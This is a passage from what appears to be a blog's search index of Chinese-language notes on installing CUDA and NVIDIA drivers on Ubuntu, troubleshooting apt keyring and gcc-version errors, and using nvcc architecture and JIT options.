upgraded, 76 newly installed, 15 to remove and 21 not upgraded.\nNeed to get 0 B/3,012 MB of archives.\nAfter this operation, 7,064 MB of additional disk space will be used.\nDo you want to continue? [Y/n]\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#runfile","title":"runfile","text":"<p>\u4e0d\u5efa\u8bae\u4f7f\u7528\uff0c\u5426\u5219\u4f1a\u548c apt \u65b9\u6cd5\u51b2\u7a81\u3002\u4e14\u6ca1\u6709\u4e86 apt \u7684\u7ba1\u7406\u65b9\u5f0f\u3002</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#snode5-invalid-device-ordinal","title":"snode5 invalid device ordinal","text":"<pre><code>(base) fyyuan@snode5 \u279c  cuda-samples-11.0 git:(main) \u2717 bin/x86_64/linux/release/bandwidthTest\n[CUDA Bandwidth Test] - Starting...\nRunning on...\n\ncudaGetDeviceProperties returned 101\n-&gt; invalid device ordinal\nCUDA error at bandwidthTest.cu:256 code=101(cudaErrorInvalidDevice) \"cudaSetDevice(currentDevice)\"\n</code></pre> <pre><code>(base) fyyuan@snode5 \u279c  ~ sudo apt list --installed|grep nvidia\n\nWARNING: apt does not have a stable CLI interface. Use with caution in scripts.\n\nlibnvidia-cfg1-470/now 470.182.03-0ubuntu0.20.04.1 amd64 [installed,upgradable to: 470.256.02-0ubuntu0.20.04.1]\nlibnvidia-common-470/now 470.182.03-0ubuntu0.20.04.1 all [installed,upgradable to: 470.256.02-0ubuntu0.20.04.1]\nlibnvidia-compute-470/now 470.182.03-0ubuntu0.20.04.1 amd64 [installed,upgradable to: 470.256.02-0ubuntu0.20.04.1]\nlibnvidia-container-tools/now 1.13.0-1 amd64 [installed,local]\nlibnvidia-container1/now 1.13.0-1 amd64 [installed,local]\nlibnvidia-decode-470/now 470.182.03-0ubuntu0.20.04.1 amd64 [installed,upgradable to: 470.256.02-0ubuntu0.20.04.1]\nlibnvidia-encode-470/now 470.182.03-0ubuntu0.20.04.1 amd64 [installed,upgradable to: 470.256.02-0ubuntu0.20.04.1]\nlibnvidia-extra-470/now 470.182.03-0ubuntu0.20.04.1 amd64 [installed,upgradable to: 470.256.02-0ubuntu0.20.04.1]\nlibnvidia-fbc1-470/now 470.182.03-0ubuntu0.20.04.1 amd64 [installed,upgradable to: 470.256.02-0ubuntu0.20.04.1]\nlibnvidia-gl-470/now 470.182.03-0ubuntu0.20.04.1 amd64 [installed,upgradable to: 470.256.02-0ubuntu0.20.04.1]\nlibnvidia-ifr1-470/now 470.182.03-0ubuntu0.20.04.1 amd64 [installed,upgradable to: 470.256.02-0ubuntu0.20.04.1]\nlibnvidia-ml-dev/focal,now 10.1.243-3 amd64 [installed]\nnvidia-compute-utils-470/now 470.182.03-0ubuntu0.20.04.1 amd64 [installed,upgradable to: 470.256.02-0ubuntu0.20.04.1]\nnvidia-container-runtime/now 3.13.0-1 all [installed,local]\nnvidia-container-toolkit-base/now 1.13.0-1 amd64 [installed,local]\nnvidia-container-toolkit/now 1.13.0-1 amd64 [installed,local]\nnvidia-dkms-470/now 470.182.03-0ubuntu0.20.04.1 amd64 [installed,upgradable to: 470.256.02-0ubuntu0.20.04.1]\nnvidia-driver-470/now 470.182.03-0ubuntu0.20.04.1 amd64 [installed,upgradable to: 470.256.02-0ubuntu0.20.04.1]\nnvidia-kernel-common-470/now 470.182.03-0ubuntu0.20.04.1 amd64 [installed,upgradable to: 470.256.02-0ubuntu0.20.04.1]\nnvidia-kernel-source-470/now 470.182.03-0ubuntu0.20.04.1 amd64 [installed,upgradable to: 470.256.02-0ubuntu0.20.04.1]\nnvidia-utils-470/now 470.182.03-0ubuntu0.20.04.1 amd64 [installed,upgradable to: 470.256.02-0ubuntu0.20.04.1]\nxserver-xorg-video-nvidia-470/now 470.182.03-0ubuntu0.20.04.1 amd64 [installed,upgradable to: 470.256.02-0ubuntu0.20.04.1]\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u5b89\u88c5\u4e0d\u540c\u53d1\u884c\u7248-deb","title":"\u5b89\u88c5\u4e0d\u540c\u53d1\u884c\u7248 deb","text":"<p>cuda 11.0 \u53ea\u6709 20.04 deb\uff0c\u673a\u5668\u662f 22.04\u3002</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#keyring-\u62a5\u9519","title":"keyring \u62a5\u9519","text":"<p>\u76f4\u63a5\u5b89\u88c5 deb \u6587\u4ef6\uff0c\u4f1a\u9047\u5230 keyring \u9519\u8bef</p> <pre><code>W: GPG error: file:/var/cuda-repo-ubuntu2004-11-0-local  Release: The following signatures couldn't be verified because the public key is not available: NO_PUBKEY F60F4B3D7FA2AF80\nE: The repository 'file:/var/cuda-repo-ubuntu2004-11-0-local  Release' is not signed.\nN: Updating from such a repository can't be done securely, and is therefore disabled by default.\nN: See apt-secure(8) manpage for repository creation and user configuration details.\n</code></pre> <p>\u89e3\u51b3\u914d\u7f6e apt.source \u7981\u7528\u5b89\u5168\u68c0\u67e5 <code>man apt.secue</code></p> <p>A repository which previously was authenticated but would loose this state in an update operation raises an error in all APT clients irrespective of the option to allow or forbid usage of insecure repositories. The error can be overcome by additionally setting Acquire::AllowDowngradeToInsecureRepositories to true or for Individual repositories with the sources.list(5) option allow-downgrade-to-insecure=yes.</p> <pre><code>vim /etc/apt/sources.list.d/cuda-ubuntu2004-11-0-local.list\n\ndeb [ allow-insecure=yes ] file:///var/cuda-repo-ubuntu2004-11-0-local /\n</code></pre> <p>\u5982\u679c\u8fd8\u662f\u4e0d\u884c\uff08\u6211\u9047\u5230\u4e86\uff09\uff0c\u8fd8\u662f\u9700\u8981\u6dfb\u52a0 key \u4f7f\u7528 gpg \u65b9\u5f0f\uff1a <pre><code>wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2004/x86_64/7fa2af80.pub sudo gpg --dearmor -o /usr/share/keyrings/nvidia-cuda-keyring.gpg 7fa2af80.pub echo \"deb [signed-by=/usr/share/keyrings/nvidia-cuda-keyring.gpg] https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2004/x86_64/ /\" | sudo tee /etc/apt/sources.list.d/cuda.list rm 7fa2af80.pub\n</code></pre></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#gcc-\u7248\u672c\u4e0d\u652f\u6301","title":"gcc \u7248\u672c\u4e0d\u652f\u6301","text":"<p>\u884d\u751f\u95ee\u9898</p> <pre><code>/usr/local/cuda-11.0/bin/../targets/x86_64-linux/include/crt/host_config.h:139:2: error: #error -- unsupported GNU version! gcc versions later than 9 are not supported! The nvcc flag '-allow-unsupported-compiler' can be used to override this version check; however, using an unsupported host compiler may cause compilation failure or incorrect run time execution. Use at your own risk.\n  139 | #error -- unsupported GNU version! gcc versions later than 9 are not supported! The nvcc flag '-allow-unsupported-compiler' can be used to override this version check; however, using an unsupported host compiler may cause compilation failure or incorrect run time execution. Use at your own risk.\n</code></pre> <p>\u89e3\u51b3\uff0c\u5b89\u88c5\u4e0d\u540c\u7248\u672c gcc\uff0c\u5e76\u4f7f\u7528 update-alternative \u5207\u6362 <pre><code>sudo apt install gcc-9 g++-9\nsudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-9 9\nsudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-9 9\nsudo update-alternatives --config gcc\nsudo update-alternatives --config g++\ngcc --version\n</code></pre></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u5b89\u88c5\u540e\u5f71\u54cd\u5176\u5b83\u5305","title":"\u5b89\u88c5\u540e\u5f71\u54cd\u5176\u5b83\u5305\uff1f","text":"<p>\u6b63\u5e38 20.04 apt nvidia-container-toolkit <pre><code>APT-Sources: https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2004/x86_64  Packages\nDescription: NVIDIA Container toolkit\n</code></pre></p> <pre><code>apt show nvidia-container-toolkit\nPackage: nvidia-container-toolkit\nVersion: 1.14.0~rc.2-1\nPriority: optional\nSection: utils\nMaintainer: NVIDIA CORPORATION &lt;cudatools@nvidia.com&gt;\nInstalled-Size: 2,445 kB\nDepends: nvidia-container-toolkit-base (= 1.14.0~rc.2-1), libnvidia-container-tools (&gt;= 1.14.0~rc.2-1), libnvidia-container-tools (&lt;&lt; 2.0.0), libseccomp2\nBreaks: nvidia-container-runtime (&lt;= 3.5.0-1), nvidia-container-runtime-hook\nReplaces: nvidia-container-runtime (&lt;= 3.5.0-1), nvidia-container-runtime-hook\nHomepage: https://github.com/NVIDIA/nvidia-container-toolkit\nDownload-Size: 859 kB\nAPT-Manual-Installed: yes\nAPT-Sources: https://nvidia.github.io/libnvidia-container/experimental/ubuntu18.04/amd64  Packages\nDescription: NVIDIA Container toolkit\n Provides tools and utilities to enable GPU support in containers.\n\nN: There are 15 additional records. Please use the '-a' switch to see them.\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u4e0d\u540c\u7248\u672c\u51b2\u7a81\u6027","title":"\u4e0d\u540c\u7248\u672c\u51b2\u7a81\u6027","text":"<p>https://docs.nvidia.com/cuda/cuda-installation-guide-linux/index.html#handle-conflicting-installation-methods \u603b\u7ed3\uff1a</p> <ul> <li>\u5b89\u88c5 cuda tookit\uff0c\u4e0d\u540c\u7248\u672c\u95f4\u6ca1\u6709\u51b2\u7a81</li> <li>\u5b89\u88c5 driver\uff0c\u4e0d\u540c\u7248\u672c\u4f7f\u7528\u540c\u4e00\u79cd\u65b9\u5f0f (deb \u6216 runfile) \u5b89\u88c5\u6ca1\u6709\u51b2\u7a81</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u5378\u8f7d","title":"\u5378\u8f7d","text":"<pre><code>sudo /usr/local/cuda-X.Y/bin/cuda-uninstaller  # runfile\n\n\n# cuda\nsudo apt-get --purge remove \"*cuda*\" \"*cublas*\" \"*cufft*\" \"*cufile*\" \"*curand*\" \"*cusolver*\" \"*cusparse*\" \"*gds-tools*\" \"*npp*\" \"*nvjpeg*\" \"nsight*\" \"*nvvm*\"\n\nsudo apt-get --purge remove \"*cuda*\" \"*cublas*\" \"*cufft*\" \"*curand*\" \"*cusolver*\" \"*cusparse*\" \"*npp*\" \"*nvjpeg*\" \"nsight*\" \"*nvvm*\"\n\n# driver\nsudo apt purge \"*nvidia*\" \"libxnvctrl*\"   # \u53ea\u5378\u8f7dnvidia-driver-xxx\u4e0d\u591f\n\nsudo apt autoremove\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u73af\u5883\u53d8\u91cf\u9009\u62e9\u7248\u672c","title":"\u73af\u5883\u53d8\u91cf\u9009\u62e9\u7248\u672c","text":"<pre><code>cuda_version=\"cuda-11.0\"\nexport PATH=\"/usr/local/$cuda_version/bin:$PATH\"\nexport LD_LIBRARY_PATH=\"/usr/local/$cuda_version/lib64:$LD_LIBRARY_PATH\"\nexport demo_suite=\"/usr/local/$cuda_version/extras/demo_suite\"\n\ncd $demo_suite\n./deviceQuery   # \u83b7\u5f97\u8bbe\u5907\u4fe1\u606f\n</code></pre> <p>nvcc \u4f7f\u7528</p> <pre><code>nvcc -std=c++11 -lcurand -lcublas\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u5b9e\u4f8b","title":"\u5b9e\u4f8b","text":"<p>\u5378\u8f7d runfile \u540e\u91cd\u542f\uff08\u6ca1\u91cd\u542f\u8fd8\u6709\u5f88\u591a nvdia \u7684\u6a21\u5757\uff09</p> <pre><code>root@icarus3:/home/nfs/fyyuan# lsmod |grep nv\nnvidia_drm             65536  0\nnvidia_modeset       1273856  1 nvidia_drm\nnvidia              55701504  27 gdrdrv,nvidia_modeset\ndrm_kms_helper        184320  4 ast,nvidia_drm\ndrm                   495616  7 drm_kms_helper,drm_vram_helper,ast,nvidia,nvidia_drm,ttm\n</code></pre> <p>\u5b89\u88c5 driver</p> <pre><code>root@icarus3:/home/nfs/fyyuan# apt-cache policy nvidia-driver-530\nnvidia-driver-530:\n  Installed: 530.41.03-0ubuntu0.20.04.2\n  Candidate: 530.41.03-0ubuntu0.20.04.2\n  Version table:\n *** 530.41.03-0ubuntu0.20.04.2 500\n        500 https://mirrors.ustc.edu.cn/ubuntu focal-updates/restricted amd64 Packages\n        500 https://mirrors.ustc.edu.cn/ubuntu focal-security/restricted amd64 Packages\n        100 /var/lib/dpkg/status\n</code></pre> <p>\u5b89\u88c5 cuda</p> <pre><code>apt install nvidia-cuda-toolkit\n\nroot@icarus3:/home/nfs/fyyuan# nvcc -V\nnvcc: NVIDIA (R) Cuda compiler driver\nCopyright (c) 2005-2019 NVIDIA Corporation\nBuilt on Sun_Jul_28_19:07:16_PDT_2019\nCuda compilation tools, release 10.1, V10.1.243\n</code></pre> <p>\u7248\u672c\u592a\u8001\uff0c\u4e3a 10.1 \u7684</p> <p>i0 \u4e0a\u6709\u8bb8\u591a apt source</p> <ul> <li>cuda-ubuntu2004-12-1-local.list \u5bf9\u5e94/var/cuda-repo-ubuntu2004-12-1-local/\uff0c\u5305\u542b\u5f88\u591a deb \u6587\u4ef6</li> <li>cuda-ubuntu2004-x86_64.list \u4e3a https://developer.download.nvidia.com/compute/cuda <code>deb [signed-by=/usr/share/keyrings/cuda-archive-keyring.gpg] https://developer.download.nvidia.com/compute/cuda    /repos/ubuntu2004/x86_64/ /</code></li> <li>source.list \u4e2d\u8fd8\u76f4\u63a5\u5305\u542b<code>deb https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2004/x86_64/ /</code></li> </ul> <pre><code>root@icarus0:/usr/local/cuda-12.1/bin# ls /etc/apt/sources.list.d/\ncuda-ubuntu2004-12-1-local.list       docker.list       nvidia-container-toolkit.list.save\ncuda-ubuntu2004-12-1-local.list.save  docker.list.save  nvidia-docker.list.save\ncuda-ubuntu2004-x86_64.list           mlnx.list\ncuda-ubuntu2004-x86_64.list.save      mlnx.list.save\n</code></pre> <p>\u5b98\u7f51\u6309\u7167 deb(network)\uff0c\u53d1\u73b0\u6dfb\u52a0\u4e86\u6e90\uff0c\u8bbe\u7f6e\u4e86</p> <pre><code>root@icarus3:/home/nfs/fyyuan# apt install cuda\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nThe following additional packages will be installed:\n  cuda-12-1 cuda-cccl-12-1 cuda-command-line-tools-12-1 cuda-compiler-12-1 cuda-cudart-12-1 cuda-cudart-dev-12-1 cuda-cuobjdump-12-1 cuda-cupti-12-1\n  cuda-cupti-dev-12-1 cuda-cuxxfilt-12-1 cuda-demo-suite-12-1 cuda-documentation-12-1 cuda-driver-dev-12-1 cuda-drivers cuda-drivers-530 cuda-gdb-12-1\n  cuda-libraries-12-1 cuda-libraries-dev-12-1 cuda-nsight-12-1 cuda-nsight-compute-12-1 cuda-nsight-systems-12-1 cuda-nvcc-12-1 cuda-nvdisasm-12-1\n  cuda-nvml-dev-12-1 cuda-nvprof-12-1 cuda-nvprune-12-1 cuda-nvrtc-12-1 cuda-nvrtc-dev-12-1 cuda-nvtx-12-1 cuda-nvvp-12-1 cuda-opencl-12-1\n  cuda-opencl-dev-12-1 cuda-profiler-api-12-1 cuda-runtime-12-1 cuda-sanitizer-12-1 cuda-toolkit-12-1 cuda-toolkit-12-1-config-common\n  cuda-toolkit-12-config-common cuda-toolkit-config-common cuda-tools-12-1 cuda-visual-tools-12-1 default-jre default-jre-headless gds-tools-12-1\n  libcublas-12-1 libcublas-dev-12-1 libcufft-12-1 libcufft-dev-12-1 libcufile-12-1 libcufile-dev-12-1 libcurand-12-1 libcurand-dev-12-1 libcusolver-12-1\n  libcusolver-dev-12-1 libcusparse-12-1 libcusparse-dev-12-1 libnpp-12-1 libnpp-dev-12-1 libnvjitlink-12-1 libnvjitlink-dev-12-1 libnvjpeg-12-1\n  libnvjpeg-dev-12-1 libnvvm-samples-12-1 nsight-compute-2023.1.1 nsight-systems-2023.1.2 nvidia-modprobe nvidia-settings openjdk-11-jre\n  openjdk-11-jre-headless\nSuggested packages:\n  fonts-ipafont-gothic fonts-ipafont-mincho fonts-wqy-microhei | fonts-wqy-zenhei fonts-indic\nThe following NEW packages will be installed:\n  cuda cuda-12-1 cuda-cccl-12-1 cuda-command-line-tools-12-1 cuda-compiler-12-1 cuda-cudart-12-1 cuda-cudart-dev-12-1 cuda-cuobjdump-12-1 cuda-cupti-12-1\n  cuda-cupti-dev-12-1 cuda-cuxxfilt-12-1 cuda-demo-suite-12-1 cuda-documentation-12-1 cuda-driver-dev-12-1 cuda-drivers cuda-drivers-530 cuda-gdb-12-1\n  cuda-libraries-12-1 cuda-libraries-dev-12-1 cuda-nsight-12-1 cuda-nsight-compute-12-1 cuda-nsight-systems-12-1 cuda-nvcc-12-1 cuda-nvdisasm-12-1\n  cuda-nvml-dev-12-1 cuda-nvprof-12-1 cuda-nvprune-12-1 cuda-nvrtc-12-1 cuda-nvrtc-dev-12-1 cuda-nvtx-12-1 cuda-nvvp-12-1 cuda-opencl-12-1\n  cuda-opencl-dev-12-1 cuda-profiler-api-12-1 cuda-runtime-12-1 cuda-sanitizer-12-1 cuda-toolkit-12-1 cuda-toolkit-12-1-config-common\n  cuda-toolkit-12-config-common cuda-toolkit-config-common cuda-tools-12-1 cuda-visual-tools-12-1 default-jre default-jre-headless gds-tools-12-1\n  libcublas-12-1 libcublas-dev-12-1 libcufft-12-1 libcufft-dev-12-1 libcufile-12-1 libcufile-dev-12-1 libcurand-12-1 libcurand-dev-12-1 libcusolver-12-1\n  libcusolver-dev-12-1 libcusparse-12-1 libcusparse-dev-12-1 libnpp-12-1 libnpp-dev-12-1 libnvjitlink-12-1 libnvjitlink-dev-12-1 libnvjpeg-12-1\n  libnvjpeg-dev-12-1 libnvvm-samples-12-1 nsight-compute-2023.1.1 nsight-systems-2023.1.2 nvidia-modprobe openjdk-11-jre openjdk-11-jre-headless\nThe following packages will be upgraded:\n  nvidia-settings\n1 upgraded, 69 newly installed, 0 to remove and 59 not upgraded.\nNeed to get 2802 MB of archives.\nAfter this operation, 6511 MB of additional disk space will be used.\nDo you want to continue? [Y/n]\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#nvcc","title":"NVCC","text":"","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u4e24\u9636\u6bb5\u7f16\u8bd1","title":"\u4e24\u9636\u6bb5\u7f16\u8bd1","text":"<p>GPU \u4e0d\u540c generation\uff0c\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u662f\u4e0d\u517c\u5bb9\u7684\u3002\u4e3a\u4e86\u4fdd\u8bc1\u5e94\u7528\u7684\u517c\u5bb9\u6027\uff0c\u91c7\u7528\u4e86\u4e24\u9636\u6bb5\u7f16\u8bd1\u3002</p> <p>NVIDIA CUDA Compiler Driver</p> <ul> <li>nvcc \u603b\u662f\u9700\u8981\u4f7f\u7528\u4e24\u4e2a\u67b6\u6784\uff1a\u865a\u62df\u67b6\u6784 (compute_xx) \u548c\u771f\u5b9e\u67b6\u6784 (sm_xx)</li> <li>sm \u5fc5\u987b\u5b9e\u73b0\u4e86 compute \u7684\u529f\u80fd</li> <li>\u865a\u62df\u67b6\u6784\u8868\u660e\u4e86\u5e94\u7528\u4f7f\u7528\u5230\u7684\u80fd\u529b\uff0c\u4f7f\u7528\u66f4\u4f4e\u7684\u865a\u62df\u67b6\u6784\u5141\u8bb8\u5728\u66f4\u5e7f\u6cdb\u7684\u786c\u4ef6\u4e0a\u8fd0\u884c</li> <li>\u771f\u5b9e\u67b6\u6784\u8d8a\u9ad8\uff0c\u751f\u6210\u7684\u4ee3\u7801\u5c31\u66f4\u9ad8\u6548\uff08\u786c\u4ef6\u7279\u6027\u66f4\u591a\uff09 </li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#jit-\u673a\u5236","title":"JIT \u673a\u5236","text":"<ul> <li>\u5c06 cubin \u751f\u6210\u63a8\u8fdf\u5230\u8fd0\u884c\u65f6</li> <li>\u7f3a\u70b9\u662f\u589e\u52a0\u4e86\u5e94\u7528 startup \u5ef6\u8fdf </li> </ul> <p>By specifying a virtual code architecture instead of a\u00a0real\u00a0GPU,\u00a0<code>nvcc</code>\u00a0postpones the assembly of PTX code until application runtime, at which time the target GPU is exactly known.</p> <pre><code>nvcc x.cu --gpu-architecture=compute_50 --gpu-code=compute_50\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#fatbinaries","title":"fatbinaries","text":"<p>A different solution to overcome startup delay by JIT while still allowing execution on newer GPUs is to specify multiple code instances</p> <pre><code>nvcc x.cu --gpu-architecture=compute_50 --gpu-code=compute_50,sm_50,sm_52\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#example","title":"example","text":"<p>NVIDIA CUDA Compiler Driver</p> <p><code>--gpu-architecture</code>\u6216<code>-arch</code></p> <pre><code>nvcc x.cu --gpu-architecture=compute_50 --gpu-code=sm_50,sm_52\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#jit","title":"JIT","text":"<p>gpu-code \u5982\u679c\u4e5f\u6307\u5b9a\u865a\u62df\u67b6\u6784\uff0c\u8868\u660e\u4f7f\u7528 JIT <code>--gpu-code</code>\u00a0arguments can be virtual architectures. In this case the stage 2 translation will be omitted for such virtual architecture, and the stage 1 PTX result will be embedded instead. At application launch, and in case the driver does not find a better alternative, the stage 2 compilation will be invoked by the driver with the PTX as input.</p> <pre><code>nvcc x.cu --gpu-architecture=compute_50 --gpu-code=compute_50,sm_50,sm_52\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u7701\u7565-gpu-code","title":"\u7701\u7565 gpu-code","text":"<pre><code>nvcc x.cu --gpu-architecture=sm_52\nnvcc x.cu --gpu-architecture=compute_50\n</code></pre> <p>\u5206\u522b\u7b49\u4ef7\u4e8e</p> <pre><code>nvcc x.cu --gpu-architecture=compute_52 --gpu-code=sm_52,compute_52\nnvcc x.cu --gpu-architecture=compute_50 --gpu-code=compute_50\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u540c\u65f6\u7701\u7565-arch-gpu-code","title":"\u540c\u65f6\u7701\u7565 arch, gpu-code","text":"<p>\u9ed8\u8ba4\u4f7f\u7528 sm_52\uff1f</p> <pre><code>nvcc x.cu\n# \u7b49\u4ef7\u4e8e\nnvcc x.cu --gpu-architecture=compute_52 --gpu-code=sm_52,compute_52\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#-generate-code-\u6307\u5b9a\u591a\u79cd\u7ec4\u5408","title":"-generate-code \u6307\u5b9a\u591a\u79cd\u7ec4\u5408","text":"<p>\u4f7f\u7528\u4e00\u4e2a\u865a\u62df\u67b6\u6784\uff0c\u9650\u5236\u4e86\u529f\u80fd\u3002\u53ef\u4ee5\u4e3a\u4e0d\u540c\u786c\u4ef6\u6307\u5b9a\u4e0d\u540c\u865a\u62df\u67b6\u6784</p> <p><code>compute_50</code> assumes no half-precision floating-point operation support for both the\u00a0<code>sm_50</code>\u00a0code and the\u00a0<code>sm_53</code>\u00a0code:</p> <pre><code>nvcc x.cu \\\n    --generate-code arch=compute_50,code=sm_50 \\\n    --generate-code arch=compute_50,code=sm_52 \\\n    --generate-code arch=compute_53,code=sm_53\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u67e5\u770b\u7f16\u8bd1\u7ed3\u679c\u5305\u542b\u54ea\u4e9b\u7248\u672c","title":"\u67e5\u770b\u7f16\u8bd1\u7ed3\u679c\u5305\u542b\u54ea\u4e9b\u7248\u672c","text":"<pre><code>cuobjdump --list-elf\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#nvcc-\u9009\u9879","title":"nvcc \u9009\u9879","text":"<p>On all platforms, the default host compiler executable (<code>gcc</code>\u00a0and\u00a0<code>g++</code>\u00a0on Linux and\u00a0<code>cl.exe</code>\u00a0on Windows) found in the current execution search path will be used, unless specified otherwise with appropriate options </p> <p>NVIDIA CUDA Compiler Driver</p> <p>When\u00a0<code>-arch=native</code>\u00a0is specified,\u00a0<code>nvcc</code>\u00a0detects the visible GPUs on the system and generates codes for them, no PTX program will be generated for this option. It is a warning if there are no visible supported GPU on the system, and the default architecture will be used.</p> <p>If\u00a0<code>-arch=all</code>\u00a0is specified,\u00a0<code>nvcc</code>\u00a0embeds a compiled code image for all supported architectures\u00a0<code>(sm_*)</code>, and a PTX program for the highest major virtual architecture. For\u00a0<code>-arch=all-major</code>,\u00a0<code>nvcc</code>\u00a0embeds a compiled code image for all supported major versions\u00a0<code>(sm_*0)</code>, plus the earliest supported, and adds a PTX program for the highest major virtual architecture.</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u73af\u5883\u53d8\u91cf","title":"\u73af\u5883\u53d8\u91cf","text":"<p>https://docs.nvidia.com/cuda/cuda-compiler-driver-nvcc/index.html#nvcc-environment-variables</p> <pre><code>export NVCC_PREPEND_FLAGS='-G -keep -arch=sm_60'\nexport NVCC_APPEND_FLAGS='-DNAME=\" foo \"'\n</code></pre> <pre><code>nvcc foo.cu -o foo\n# \u7b49\u4ef7\u4e8e\nnvcc -G -keep -arch=sm_60 foo.cu -o foo -DNAME=\" foo \"\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#cuda-\u7f16\u7a0b","title":"Cuda \u7f16\u7a0b","text":"","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u591a-device-\u7cfb\u7edf","title":"\u591a device \u7cfb\u7edf","text":"<p>\u5f88\u591a\u64cd\u4f5c\u90fd\u53ef\u4ee5\u5e76\u53d1\u6267\u884c\uff0c\u5982 host \u548c device\u3001memory \u590d\u5236\u548c kernel launch \u7b49</p> <p>steram \u662f\u7528\u6765\u7ba1\u7406\u5e76\u53d1\u6267\u884c\u7684</p> <p>A host thread can set the device it operates on at any time by calling\u00a0<code>cudaSetDevice()</code>. Device memory allocations and kernel launches are made on the currently set device; streams and events are created in association with the currently set device. If no call to\u00a0<code>cudaSetDevice()</code>\u00a0is made, the current device is device 